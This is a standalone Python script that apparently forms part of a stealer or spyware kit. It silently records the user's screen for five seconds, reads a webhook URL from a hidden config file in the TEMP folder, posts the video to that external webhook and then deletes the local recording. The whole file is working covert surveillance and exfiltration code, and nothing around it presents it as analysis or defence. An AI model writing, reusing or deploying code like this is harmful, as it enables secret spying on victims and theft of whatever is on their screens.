import os
import pyautogui
import requests
import cv2
import numpy as np
from io import BytesIO
import time

webhook_path = os.path.join(os.getenv('TEMP'), 'config', 'webhook.txt')

try:
    with open(webhook_path, 'r') as file:
        webhook_url = file.read().strip()
except FileNotFoundError:
    exit()

screen_width, screen_height = pyautogui.size()

fourcc = cv2.VideoWriter_fourcc(*'XVID')
video_filename = "screen_recording.avi"
out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))

start_time = time.time()
while time.time() - start_time < 5:
    screenshot = pyautogui.screenshot()
    frame = np.array(screenshot)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR) 
    out.write(frame)

out.release()

with open(video_filename, 'rb') as video_file:
    video_data = video_file.read()

files = {
    'file': ('screen_recording.avi', video_data, 'video/avi')
}
data = {
    "username": "🎥 Enregistrement d'écran"
}

requests.post(webhook_url, data=data, files=files)

os.remove(video_filename)
